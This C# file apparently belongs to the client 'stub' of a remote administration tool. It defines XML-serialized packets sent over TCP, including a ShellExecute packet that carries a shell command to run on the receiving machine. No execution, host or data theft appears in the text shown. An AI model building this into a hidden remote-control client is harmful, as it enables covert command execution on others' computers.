using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Net.Sockets;
using System.Text;
using System.Threading.Tasks;
using System.Xml.Serialization;

namespace Stub
{
    // Not to be mixed with other classes, just for sending!
    public class PacketData
    {
        public int i;
        public ClientData clientData;
    }
    public class BasePacket
    {
    }
    public class ShellExecute : BasePacket
    {
        public string Command;
    }
    public class Packet
    {
        unsafe public void SendPacket<T>(T obj, PacketData packetData)
        {
            NetworkStream stream = packetData.clientData.Client.GetStream();
            using (StringWriter textWriter = new StringWriter())
            {
                new XmlSerializer(typeof(T)).Serialize(textWriter, obj);
                var msg = textWriter.ToString();
                byte[] data = Encoding.ASCII.GetBytes(msg);
                packetData.clientData.Client.GetStream().Write(data, 0, data.Length);
            }
        }
        public object ParsePacketType(string msg)
        {
            if (msg.Contains("ClientConnectionsListObject"))
            {
                ClientConnectionsListObject clientConnectionsListObject = new ClientConnectionsListObject();
                clientConnectionsListObject = (ClientConnectionsListObject)new XmlSerializer(typeof(ClientConnectionsListObject)).Deserialize(new StringReader(msg));
                return clientConnectionsListObject;
            }
            else if (msg.Contains("ShellExecute"))
            {
                ShellExecute shellExecute = new ShellExecute();
                shellExecute = (ShellExecute)new XmlSerializer(typeof(ShellExecute)).Deserialize(new StringReader(msg));
                return shellExecute;
            }

            return new BasePacket();
        }
    }
    
}
